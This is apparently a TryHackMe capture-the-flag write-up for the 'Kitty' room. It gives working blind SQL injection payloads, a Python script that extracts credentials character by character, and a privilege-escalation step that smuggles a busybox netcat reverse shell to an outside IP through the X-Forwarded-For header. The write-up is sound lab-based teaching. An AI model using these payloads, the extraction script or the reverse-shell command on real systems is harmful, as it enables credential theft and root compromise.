---
title: "Kitty"
date: 08-12-2025
excerpt: TryHackMe Writeup
cover: ../uploads/cover_kitty.jpg
tags: Blind SQL Injection, Command Injection
---

Welcome back to my write-up! I appreciate your patience, it's been a while since my last post, but I'm excited to share another one with you. Today, I'll be walking you through a detailed, step-by-step breakdown of how I successfully tackled the *Kitty* challenge from TryHackMe. I'll cover my thought process, the tools I used, and the techniques that led me to the final flag. Let's dive in!

## Reconnaissance

First, we need to enumerate the open ports of our target for our potential entry point

```shell
nmap -sC -sV -oN nmap_result.log -v <IP>
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*wgsGVT8wcx8d7NwMuOlv8Q.png&width=768&dpr=3&quality=100&sign=ff397000&sv=2)

As you can see here, port 22 (ssh) and 80 (http) are open. SSH gives us a likely path for a shell once we have valid credentials, and port 80 is our initial attack surface — so that's where we start.

Let's visit the webpage.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*VORNghRbWejSC3qWg3i8BQ.png&width=768&dpr=3&quality=100&sign=8b86bcb7&sv=2)

As you can see, I was directed to a login page. The first thing I did was fill in random credentials to observe how the login page would react — establishing a "baseline" response is important, since we need something to compare against once we start sending unusual input. I also tried some basic and classic SQLi payloads, and surprisingly, the login page responded differently.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*UQ7sgIyi2rKo1PFOL8Ow9g.png&width=768&dpr=3&quality=100&sign=c2dd410&sv=2)

The classic OR payload

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*jOnMy62Hc-ln2-eHMNXN5g.png&width=768&dpr=3&quality=100&sign=31b94ec&sv=2)

This is the respond

Hmmm…. Something interesting isn't it? Looks like this is a hint for us that we need to bypass this mechanism to access something. The application appears to be actively detecting and flagging suspicious SQL keywords rather than just failing silently — this is an important clue we'll come back to later.

We will not focus on that for a while, let's try to enumerate the subdirectories of the web page first for more information.

```shell
gobuster dir -u http://kitty.thm/ -w /usr/share/wordlists/dirb/big.txt -t 64 -x php -q
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*emM4JpnmQA2ZxMoz-LnxNg.png&width=768&dpr=3&quality=100&sign=a41b0dcc&sv=2)

As you noticed, there's a register.php, looks like we can make an account in order for us to login.

So I go to **register.php** and I was able to make a new account to login

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*nFxeAFg3O4VPzrLTGFqawQ.png&width=768&dpr=3&quality=100&sign=81335cdc&sv=2)

After submitting, I was automatically taken back to the login page. I then used the account I had created to log in, and it successfully granted me access!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*RZNi1VE3bPda8LoCTGa4aA.png&width=768&dpr=3&quality=100&sign=4b1f983f&sv=2)

But the only thing that we can do is to logout, how lame. Now what?

## Discovering the SQL Injection Point

Remember the SQLi detection earlier? Maybe that's the way for us to gain higher access. So I used different variants of SQLi payloads, and one of them works.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*RpfYBidxWFxay0DDEtNAuQ.png&width=768&dpr=3&quality=100&sign=4b4e4267&sv=2)

This payload didn't work, it returns invalid username and password

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*gRtdodKrvxO66XbgBobN_g.png&width=768&dpr=3&quality=100&sign=65c44f70&sv=2)

And this one actually works!

This is a clear indication that this is vulnerable to **Blind Boolean SQL Injection** — meaning the application never shows us database output directly (no error messages leaking data, no reflected query results), but it *does* behave differently depending on whether our injected condition evaluates to true or false. In this case, that "tell" is the response's content length: a true condition returns a page of one length, and a false condition returns a different length (typically because a login success/failure message has a different character count than the generic error). We can leverage this true/false oracle to enumerate the database, uncover underlying tables, and extract their entries — one bit of information at a time.

```sql
' UNION SELECT 1,2,3,4 where database() like '%'; -- -
```

By utilizing the **database()** function, we can systematically enumerate the database name. This is achieved by iterating through each letter using the **LIKE** operator along with the `%` wildcard. By checking for matches one character at a time, we gradually reconstruct the database name. If a correct match is found at any stage, it confirms our guess and allows us to proceed further, potentially leading to successful authentication or deeper exploitation of the system.

```sql
' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = 'dbname' and table_name like '%';-- -
```

This payload uses the **UNION SELECT** technique to retrieve table names from **information_schema.tables**, which stores metadata about all database tables. The **table_schema = 'mywebsite'** filter ensures that only tables from the target database are retrieved, while **table_name LIKE '%'** lists all tables within it. The comment at the end comments out the rest of the original SQL query to prevent syntax errors. If successful, this query can expose the names of all tables in the database.

```sql
' UNION SELECT 1,2,3,4 from table_name where username like '%' -- -
```

This SQL injection payload uses the **UNION SELECT** method to retrieve data from a specified table, bypassing the original query. It works by matching the number of columns expected in the original query and then fetching data from the targeted table, in this case, user-related information. The condition used ensures that all entries are retrieved, and the comment (`-- -`) at the end of the payload disables the rest of the original query, preventing syntax errors. If successful, this attack can expose sensitive data, such as usernames, from the targeted database.

```sql
' UNION SELECT 1,2,3,4 from siteusers where username = 'username' and password like '%' -- -
```

Once we have the username, we will do the same thing as we did to retrieve the password, we will just add **AND password** to retrieve the password that is connected to that username.

## Why Not Just Use SQLMap?

Given this is boolean-based SQL injection, the obvious first instinct might be to throw **SQLMap** at it and let it do the enumeration automatically. In this case, though, a hand-written script turned out to be the more reliable choice, for a few specific reasons:

1. **The application has active keyword filtering.** We already saw this firsthand — one of our very first payloads triggered a distinct **"SQL Injection detected"** response rather than a normal login failure. This strongly suggests the app is pattern-matching on common SQLi indicators (things like `OR 1=1`, boolean tautologies, certain keyword combinations, or specific comment styles) and short-circuiting with a canned error page whenever it sees them. SQLMap's default detection and exploitation engine is *built around* firing exactly those kinds of generic, well-known signature payloads — tautologies, `SLEEP()` calls, classic boolean tests, a wide variety of comment styles, etc. — as it tries to fingerprint the injection. Most of that traffic would immediately get flagged by this filter, drowning out the one payload style that actually works and potentially causing SQLMap's heuristics to misclassify the endpoint as "not injectable" or as a false positive.

2. **The working payload is narrow and specific.** Only a `LIKE '...%'` wildcard-matching structure — not an `=` equality test, not a numeric boolean condition — got past the filter. SQLMap can be tuned with tamper scripts and custom boundaries to eventually find something like this, but that tuning process itself requires knowing in advance what the filter blocks, which defeats the purpose of relying on automation to discover it for us. It's often faster to identify the one working pattern manually (as we did above) and then automate *only* that exact pattern ourselves.

3. **The true/false oracle is unusual.** Our oracle here is the raw **response body length** (specifically, we know a "true" condition returns a response of exactly 618 bytes), not a keyword like "Welcome" appearing or disappearing, and not a timing difference. SQLMap can be pointed at a custom boolean string with `--string` or `--not-string`, but getting that dialed in precisely — especially against an app that returns different content lengths for several different states (invalid login, SQLi detected, valid boolean match) — is fiddly, and a false configuration risks silently pulling garbage data or getting stuck.

4. **Later stages need each result fed into the next query.** Extracting the table name, then the username, then the password isn't three independent queries — each one depends on the previous result being correctly reconstructed and substituted back into the payload (as seen in the `make_query()` phases below). This kind of dynamic, sequential extraction is exactly what a small custom Python script handles cleanly, without needing to fight SQLMap's more generic, one-size-fits-all extraction workflow.

In short: SQLMap is excellent when an application's SQLi behaves in a fairly standard way, but here the combination of active filtering, an unusual oracle, and a fixed 4-column UNION structure made a small purpose-built script both faster to get working and easier to control precisely.

## Exploitation

Now that we have all the payloads, time to develop our exploit!

```python
#!/usr/bin/env python3
# Author: Kur0sh1r0

import requests

# Character set used for brute-forcing database, table, username, and password.
CHARSET = '+-{}(), abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'

# Target URL where the SQL injection will be performed.
TARGET_URL = 'http://kitty.thm/index.php'

# HTTP headers used in the requests.
HEADERS = {
    'Host': 'kitty.thm',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://kitty.thm',
    'Connection': 'close',
    'Referer': 'http://kitty.thm/index.php',
    'Upgrade-Insecure-Requests': '1'
}

# Variables to store extracted database, table, username, and password.
db_result = ''
tbl_result = ''
usr_result = ''
pwd_result = ''

def make_query(phase, partial_result, charset_char):
    """Generate the SQL query based on the current phase."""
    if phase == 1:
        # Extracting database name
        return f"' UNION SELECT 1,2,3,4 where database() like '{partial_result}{charset_char}%' ;-- -"
    elif phase == 2:
        # Extracting table name from the identified database
        return f"' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = '{db_result}' and table_name like '{partial_result}{charset_char}%';-- -"
    elif phase == 3:
        # Extracting username from the identified table
        return f"' UNION SELECT 1,2,3,4 from {tbl_result} where username like '{partial_result}{charset_char}%' -- -"
    elif phase == 4:
        # Extracting password for the identified username
        return f"' UNION SELECT 1,2,3,4 from {tbl_result} where username = '{usr_result}' and password like BINARY '{partial_result}{charset_char}%' -- -"

def send_post_request(query_string):
    """Send an HTTP POST request with the given SQL injection payload."""
    post_data = {
        'username': query_string,
        'password': '123456'  # Placeholder password, not used in injection
    }
    return requests.post(TARGET_URL, headers=HEADERS, data=post_data, allow_redirects=True)

def update_result(phase, partial_result, charset_char):
    """Update the result variables based on the server response."""
    global db_result, tbl_result, usr_result, pwd_result
    if len(send_post_request(make_query(phase, partial_result, charset_char)).content) == 618:
        if phase == 1:
            db_result += charset_char
        elif phase == 2:
            tbl_result += charset_char
        elif phase == 3:
            usr_result += charset_char
        elif phase == 4:
            pwd_result += charset_char
        return True
    return False

def print_status(phase, partial_result, charset_char, is_final=False):
    """Display extraction progress dynamically."""
    print('\033[K', end='')  # Clear line for updated progress display
    if phase == 1:
        print(f"Retrieving Database: {db_result}{charset_char}", end='\r')
    elif phase == 2:
        print(f"Retrieving Table: {tbl_result}{charset_char}", end='\r')
    elif phase == 3:
        print(f"Retrieving User: {usr_result}{charset_char}", end='\r')
    elif phase == 4:
        print(f"Retrieving Password: {pwd_result}{charset_char}", end='\r')
    
    # Print final result when extraction is complete
    if is_final:
        if phase == 1:
            print(f"\nDatabase Identified: {db_result}")
        elif phase == 2:
            print(f"\nTable Identified: {tbl_result}")
        elif phase == 3:
            print(f"\nUser Identified: {usr_result}")
        elif phase == 4:
            print(f"\nPassword Identified: {pwd_result}")
            exit(0)

def main():
    """Main function to execute the SQL injection attack in different phases."""
    global db_result, tbl_result, usr_result, pwd_result
    current_phase = 1
    while current_phase < 5:
        for char in CHARSET:
            # Attempt to update result by injecting current character
            if update_result(current_phase, eval(f'{["db", "tbl", "usr", "pwd"][current_phase-1]}_result'), char):
                break  # Move to next character once a match is found
            
            if char == CHARSET[-1]:  # If last character in charset is reached
                print_status(current_phase, eval(f'{["db", "tbl", "usr", "pwd"][current_phase-1]}_result'), char, is_final=True)
                current_phase += 1  # Move to the next phase
            
            if char != "\n":  # Avoid displaying newline characters
                print_status(current_phase, eval(f'{["db", "tbl", "usr", "pwd"][current_phase-1]}_result'), char)

if __name__ == "__main__":
    main()
```

**How this script works, in plain terms:** it walks through four phases in sequence — database name, then table name, then username, then password — and for each phase it brute-forces one character at a time. For every candidate character, it appends it to whatever we've correctly guessed so far, sends that as the injected payload, and checks whether the response is exactly **618 bytes** long (our confirmed "true" signal from testing manually). If it matches, that character is locked in and we move to the next position; if we reach the end of the character set with no match, we assume we've found the full string and advance to the next phase. This is essentially automating the exact manual process demonstrated by the SQL payloads above, just done character-by-character until each value is fully reconstructed.

Run and we should able to bruteforce the database, table, username, and password!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*dlGDt8FWyQKLT6nna_ND6A.png&width=768&dpr=3&quality=100&sign=6fa38348&sv=2)

The Output

We've successfully got the credentials for user **kitty!** Now let's login as **kitty** through SSH.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*mEuojMNQDD0l6mBIZN_e_g.png&width=768&dpr=3&quality=100&sign=98ecde60&sv=2)

After logging in, we now have the first flag!

## Privilege Escalation

I used **linpeas** — a well-known enumeration script that automatically checks a Linux system for common misconfigurations, weak permissions, and privilege escalation vectors — to look for anything unusual. And after running it I found this:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*C4VVOxJuy802myODqNYKgA.png&width=768&dpr=3&quality=100&sign=b588c544&sv=2)

As you can see here, the **/opt** directory is empty by default on most systems, but why is there a `log_checker.sh` inside `/opt`? An unexpected script in a normally-empty directory is a strong signal that it's part of a scheduled task or automation set up specifically for this box — worth investigating closely.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*QoRR4oZ1znkEqC6EOfg-Sg.png&width=768&dpr=3&quality=100&sign=22e120da&sv=2)

We don't have write access to the script itself, but reading it reveals its logic: it reads IP addresses from the file **/var/www/development/logged**, appends each IP to **/root/logged**, and then clears the original file. The key detail is that the script spawns a new shell to echo the IP into **/root/logged**. This means that if we can control the *value* being written into that file — even though we can't edit the script — we may be able to inject shell commands that get executed when the script processes that value, since it's likely being run with elevated (root) privileges via a cron job or similar scheduled mechanism.

Let's take a look at **/var/www/development.**

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*wZsgPvgaDKPrJ0P7AguVJw.png&width=768&dpr=3&quality=100&sign=ea5b124d&sv=2)

The login system is filtering the **username** and **password** parameters for specific keywords — this is the same keyword-based SQLi filter we encountered earlier on the live site. If any of these restricted keywords are present, the system triggers the **"SQL Injection detected"** error, just like we saw earlier.

Additionally, we noticed that the server logs the content of the **X-Forwarded-For** header into the **logged** file. This presents an opportunity to inject arbitrary content into that file — because unlike the `username`/`password` fields, this header apparently isn't being filtered the same way, giving us a second, unmonitored injection point into a file that a privileged script later processes.

If the script processing this log later executes or interacts with its contents unsafely, we might be able to **escalate this into code execution** or **manipulate the system in unexpected ways**. This could lead to **command injection, privilege escalation, or even a full shell**, depending on how the logged data is handled.

Here's what we can do to abuse this vulnerability: we attempt to log in while deliberately using one of the restricted keywords as the **username** to trigger the **SQL Injection detected** error (this just gives us a login attempt that completes without needing valid credentials). At the same time, we include a custom **X-Forwarded-For** header to control what gets logged in **/var/www/development/logged**. By doing this, we can test whether our input is successfully written to the log file. If the system blindly stores our header value without sanitization, this could allow us to inject arbitrary content, potentially leading to **command execution, privilege escalation, or even remote code execution (RCE)** if another process interacts with the log file unsafely.

```shell
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: god" -d "username=kur0sh1r0x&password=123456" http://127.0.0.1:8080/index.php
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*3qTMh-VqSXa_OThvOiWNog.png&width=768&dpr=3&quality=100&sign=58d1f7ac&sv=2)

This confirms that we can now inject content into the **logged** file by manipulating the **X-Forwarded-For** header — our test string `god` shows up where we'd expect an IP address, proving the header value is written into the file without validation.

I checked if the machine has netcat installed and it has!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*Uk5RnHT8oKEyROmg-Upkqw.png&width=768&dpr=3&quality=100&sign=125e95&sv=2)

Having netcat available on the target matters because it means we can use it to establish a reverse shell — a connection initiated *from* the victim machine back *to* us — without needing to drop any additional tools onto the box.

It's time for us to inject a reverse shell payload to have a root shell!

```shell
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: \$(busybox nc 10.8.31.147 4343 -e /bin/bash)" -d "username=kur0sh1r0x&password=123456" http://127.0.0.1:8080/index.php
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*1AUpqbOZNTRxtopSzfMM5w.png&width=768&dpr=3&quality=100&sign=603c87e7&sv=2)

I initially missed a closing **')'** at the end of the payload, but I fixed it after realizing it wasn't working.

Before we execute this, we need to setup a listener first using netcat — this is what will catch the incoming connection once our injected command runs on the target. After setting up, we can now execute the payload and gain a root shell!

```shell
nc -lnvp 4343
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*CnA_WNLZpHXSNHUK9ltsDA.png&width=768&dpr=3&quality=100&sign=8969647a&sv=2)

And we are now root!!!

## Conclusion

The challenge demonstrated the process of identifying and exploiting SQL injection vulnerabilities to extract valuable data from a database. By leveraging UNION-based SQL injection techniques, we were able to enumerate database structures, retrieve user information, and bypass authentication mechanisms. We also saw firsthand why an automated tool like SQLMap isn't always the right first move — active keyword filtering, an unusual content-length-based oracle, and a query structure that depended on chaining results from one phase into the next made a small, purpose-built script both more reliable and easier to reason about than a generic scanner.

Additionally, we explored how to further abuse this vulnerability by deliberately using restricted keywords as the username to trigger an SQL Injection detected error while injecting a custom **X-Forwarded-For** header. This allowed us to manipulate log entries stored in **/var/www/development/logged**, testing whether our input was successfully written. Because the system blindly stored our header value without sanitization, it opened the door to a more severe exploit — command execution via a reverse shell, run in the context of whatever privileged process was consuming that log file, ultimately giving us root.

This highlights the critical importance of implementing strict input validation on *every* user-controllable input (not just the obvious ones like login fields), proper handling of log data before it's ever passed to a shell or interpreter, and adopting secure coding practices throughout an application's full request pipeline to prevent this kind of chained exploitation.
